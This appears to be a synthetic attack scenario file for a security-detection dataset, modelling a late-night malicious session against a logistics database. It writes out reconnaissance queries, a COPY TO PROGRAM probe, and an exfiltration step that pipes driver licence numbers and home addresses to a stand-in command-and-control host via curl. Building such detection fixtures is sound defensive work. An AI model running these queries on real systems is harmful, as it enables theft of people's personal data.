@@ -1,0 +1,38 @@
+scenario_id: logistics_lateral_move_0004
+family_id: logistics_lateral_move_0004
+domain: logistics
+time_of_day: 02:15
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: recon
+  role: dispatcher
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 2.1872316755925763
+  events:
+  - sql: SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public'
+  - sql: SELECT shipment_id, dest_address, driver_id FROM shipments WHERE status = 'in_transit'
+  - step_id: probe
+    sql: COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'
+- session_label: harvest
+  role: dispatcher
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 55.05378475371194
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.9518492749310357
+  events:
+  - sql: SELECT license_number, home_address, phone, full_name FROM drivers
+  - sql: SELECT shipment_id, dest_address, driver_id FROM shipments WHERE status = 'in_transit'
+  - step_id: exfil
+    sql: COPY (SELECT d.license_number, d.home_address, s.dest_address, m.declared_value FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id) TO
+      PROGRAM 'curl -sX POST https://c2.example.net/harvest -d @-'
+    connects_to:
+      ip: 185.100.87.41
+      port: 9443
